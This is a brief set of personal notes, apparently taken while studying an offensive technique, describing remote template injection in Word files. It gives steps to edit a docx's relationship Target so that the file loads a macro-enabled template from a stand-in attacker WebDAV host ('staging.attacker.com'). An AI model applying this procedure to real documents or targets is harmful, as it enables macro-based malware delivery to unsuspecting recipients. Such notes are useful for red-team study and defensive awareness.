# BLS Notes
http://blog.redxorblue.com/2018/07/executing-macros-from-docx-with-remote.html

Remote Template Injection is a method of bypassing file restrictions by including a remote template with macros in a regular docx file.

## Creating the template

1. Create MSOffice document with macro & save as `.dotm`
    - This will be hosted on a remote site, e.g. webdav or https

## Creating the DOCX File

1. Create a regular word document from a default template (e.g. "simple invoice", etc.).
2. Change the file type from 'docx' to 'zip' and extract the files in the zip folder.
3. Navigate to `\word\_rels` within the folder and edit the `settings.xml` file.
4. Change the "Target" section to `\\staging.attacker.com\webdav\evil.dotm`.

5. Rezip these files, then rename the zipped folder back into a 'docx'.
